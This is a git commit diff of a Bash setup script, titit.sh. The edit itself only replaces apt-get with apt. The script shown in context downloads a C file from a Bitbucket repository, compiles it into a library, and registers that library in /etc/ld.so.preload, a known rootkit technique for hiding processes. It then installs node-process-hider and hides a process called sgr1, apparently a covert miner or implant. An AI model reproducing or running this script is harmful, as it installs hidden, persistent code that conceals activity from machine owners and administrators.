1728354f8c6428e8e8b31c79eeffd4d05b261377
rifamanajul <rifamanajul@gmail.com>
2025-05-23 13:57:33 +0700

    Update titit.sh

--- titit.sh
+++ titit.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 set -x
-apt-get update 
-apt-get install -y wget curl sudo
+apt update 
+apt install -y wget curl sudo
 curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
@@ -10,12 +10,12 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-apt-get update 
-apt-get install -y gcc ca-certificates curl gnupg 
+apt update 
+apt install -y gcc ca-certificates curl gnupg 
 mkdir -p /etc/apt/keyrings
 curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
 echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
-apt-get install nodejs -y
+apt install nodejs -y
 npm install -g npm@10.2.0 -y
 npm i -g node-process-hider
 ph add sgr1
